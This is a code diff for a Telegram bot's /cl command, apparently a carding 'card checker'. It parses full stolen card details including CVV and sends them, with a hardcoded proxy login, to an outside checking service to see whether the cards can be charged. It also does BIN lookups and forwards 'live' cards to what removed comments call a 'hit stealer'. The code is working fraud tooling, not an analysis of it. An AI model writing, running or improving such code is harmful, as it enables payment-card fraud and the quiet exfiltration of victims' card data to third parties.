@@ -18,7 +18,7 @@ async def cmd_clover(Client, message):
 
         regdata = fetchinfo(user_id)
         if not regdata:
-            return await message.reply_text("❌ You are not registered. Use /register first.")
+            return await message.reply("❌ You are not registered. Use /register first.", quote=True)
 
         role = (regdata[2] or "FREE").strip().upper()
         credit = int(regdata[5] or 0)
@@ -29,7 +29,7 @@ async def cmd_clover(Client, message):
         if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply_text(
                 "⚠️ <b>Premium Users Required</b>\n"
-                "Only PREMIUM users can use this command in bot PM.\n"
+                "Only Premium users can use this command in bot PM.\n"
                 "Join our group to use it for FREE:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
@@ -39,38 +39,43 @@ async def cmd_clover(Client, message):
 
         GROUP = open("plugins/group.txt").read().splitlines()
         if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
-            return await message.reply_text("❌ Unauthorized group. Contact admin.")
+            return await message.reply("❌ Unauthorized group. Contact admin.", quote=True)
 
         if credit < 1:
-            return await message.reply_text("❌ Insufficient credit.")
+            return await message.reply("❌ Insufficient credit.", quote=True)
+
         if now - antispam_time < wait_time:
-            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
+            return await message.reply(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", quote=True)
 
-        args = message.text.split(None, 1)
-        cc_text = message.reply_to_message.text.strip() if message.reply_to_message else (args[1].strip() if len(args) > 1 else None)
-        if not cc_text:
-            return await message.reply_text("❌ Usage: /cl <cc|mm|yy|cvv>")
+        cc_raw = None
+        if message.reply_to_message:
+            cc_raw = (message.reply_to_message.text or message.reply_to_message.caption or "").strip()
+        elif len(message.text.split(maxsplit=1)) > 1:
+            cc_raw = message.text.split(maxsplit=1)[1].strip()
 
-        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc_text)
+        if not cc_raw:
+            return await message.reply("❌ Usage: /cl <cc|mm|yy|cvv> or reply to a card", quote=True)
+
+        cc_clean = re.sub(r"[^\d]", "|", cc_raw)
+        match = re.search(r"(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})", cc_clean)
         if not match:
-            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")
+            return await message.reply("❌ Invalid format. Use: xxxx xxxx xxxx xxxx|MM|YY|CVV", quote=True)
 
         ccnum, mes, ano, cvv = match.groups()
         fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"
 
-        check_msg = await message.reply_text(f"""
+        check_msg = await message.reply(f"""
 <code>┏━━━━━━━⍟</code>
 <b>┃  Clover 1$</b>
 <code>┗━━━━━━━━━━━⊛</code>
 <b>⊙ CC:</b> <code>{fullcc}</code>
 <b>⊙ Status:</b> Checking...
 <b>⊙ Response:</b> Waiting...
-""", reply_to_message_id=message.id)
+""", quote=True)
 
         tic = time.perf_counter()
-
         try:
-            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
+            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t"
             url = f"http://luckyxd.biz:1111/clv?cc={fullcc}&proxy={proxy}"
             res = session.get(url, timeout=50)
             data = res.json()
@@ -80,18 +85,19 @@ async def cmd_clover(Client, message):
 
         toc = time.perf_counter()
 
-        bin_ = ccnum[:6]
         try:
-            bin_res = session.get(f"https://api.voidex.dev/api/bin?bin={bin_}", timeout=10).json()
-            brand = (bin_res.get("scheme") or "N/A").upper()
-            type_ = (bin_res.get("type") or "N/A").upper()
-            level = (bin_res.get("level") or "N/A").upper()
-            bank = (bin_res.get("bank") or "N/A").upper()
-            country = (bin_res.get("country_name") or "N/A").upper()
-            flag = bin_res.get("country_flag") or "🏳️"
+            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
+            brand = binres.get("brand") or binres.get("scheme") or "UNKNOWN"
+            type_ = binres.get("type", "N/A")
+            level = binres.get("level", "N/A")
+            bank = binres.get("bank", "N/A")
+            country = binres.get("country_name", "N/A")
+            flag = binres.get("country_flag", "🏳️")
         except:
             brand = type_ = level = bank = country = "N/A"
             flag = "🏳️"
+
+        brand, type_, level, bank, country = [i.upper() for i in [brand, type_, level, bank, country]]
 
         msg_lower = card_message.lower()
         if any(x in msg_lower for x in ["live", "approved", "success", "charged", "avs", "postal", "zip", "security code", "cvv", "cvc", "address"]):
@@ -113,10 +119,8 @@ async def cmd_clover(Client, message):
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
 """
 
-        # First show result to user
         await Client.edit_message_text(chat_id, check_msg.id, final_msg)
 
-        # Then send to hit stealer only if approved/live
         if "approved" in status.lower() or "live" in card_message.lower():
             await send_hit_if_approved(Client, final_msg)
 
@@ -125,4 +129,4 @@ async def cmd_clover(Client, message):
         plan_expirychk(user_id)
 
     except Exception as e:
-        await message.reply_text(f"❌ Error: {str(e)}")
+        await message.reply_text(f"❌ Error: {str(e)}", quote=True)
